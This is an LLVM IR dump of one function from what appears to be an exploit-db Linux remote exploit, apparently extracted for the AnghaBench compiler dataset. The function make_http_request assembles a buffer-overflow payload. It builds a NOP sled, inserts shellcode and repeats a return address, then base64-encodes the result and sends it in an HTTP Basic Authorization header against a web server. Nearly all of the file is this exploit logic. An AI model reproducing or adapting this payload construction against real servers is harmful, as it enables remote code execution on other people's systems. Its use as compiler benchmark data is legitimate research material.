; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_174.c_make_http_request.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_174.c_make_http_request.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@EXP_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"malloc()\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c":x\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"GET / HTTP/1.0\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"%sHost: %s\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"%sAuthorization: Basic %s\0D\0A\0D\0A\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_http_request(i8* %0, i32 %1, i8* %2, i64* %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i64* %3, i64** %8, align 8
  %12 = load i32, i32* @EXP_SIZE, align 4
  %13 = call i64 @malloc(i32 %12)
  %14 = inttoptr i64 %13 to i8*
  store i8* %14, i8** %9, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %19, label %16

16:                                               ; preds = %4
  %17 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %4
  %20 = load i8*, i8** %9, align 8
  %21 = load i32, i32* @EXP_SIZE, align 4
  %22 = call i32 @memset(i8* %20, i32 144, i32 %21)
  %23 = load i8*, i8** %9, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 256
  %25 = load i8*, i8** @shellcode, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = sext i32 %26 to i64
  %28 = sub i64 0, %27
  %29 = getelementptr inbounds i8, i8* %24, i64 %28
  %30 = load i8*, i8** @shellcode, align 8
  %31 = call i32 @strcpy(i8* %29, i8* %30)
  store i32 256, i32* %11, align 4
  br label %32

32:                                               ; preds = %44, %19
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* @EXP_SIZE, align 4
  %35 = sub nsw i32 %34, 5
  %36 = icmp slt i32 %33, %35
  br i1 %36, label %37, label %47

37:                                               ; preds = %32
  %38 = load i8*, i8** %9, align 8
  %39 = load i32, i32* %11, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i64*, i64** %8, align 8
  %43 = call i32 @memcpy(i8* %41, i64* %42, i32 4)
  br label %44

44:                                               ; preds = %37
  %45 = load i32, i32* %11, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %11, align 4
  br label %32

47:                                               ; preds = %32
  %48 = load i8*, i8** %9, align 8
  %49 = load i32, i32* @EXP_SIZE, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = getelementptr inbounds i8, i8* %51, i64 -4
  %53 = call i32 @strcpy(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %54 = load i32, i32* @EXP_SIZE, align 4
  %55 = load i8*, i8** %9, align 8
  %56 = call i8* @encode_base64(i32 %54, i8* %55)
  store i8* %56, i8** %10, align 8
  %57 = load i8*, i8** %5, align 8
  %58 = load i32, i32* %6, align 4
  %59 = call i32 @memset(i8* %57, i32 0, i32 %58)
  %60 = load i8*, i8** %5, align 8
  %61 = call i32 (i8*, i8*, ...) @sprintf(i8* %60, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %62 = load i8*, i8** %5, align 8
  %63 = load i8*, i8** %5, align 8
  %64 = load i8*, i8** %7, align 8
  %65 = call i32 (i8*, i8*, ...) @sprintf(i8* %62, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i8* %63, i8* %64)
  %66 = load i8*, i8** %5, align 8
  %67 = load i8*, i8** %5, align 8
  %68 = load i8*, i8** %10, align 8
  %69 = call i32 (i8*, i8*, ...) @sprintf(i8* %66, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i8* %67, i8* %68)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

declare dso_local i8* @encode_base64(i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
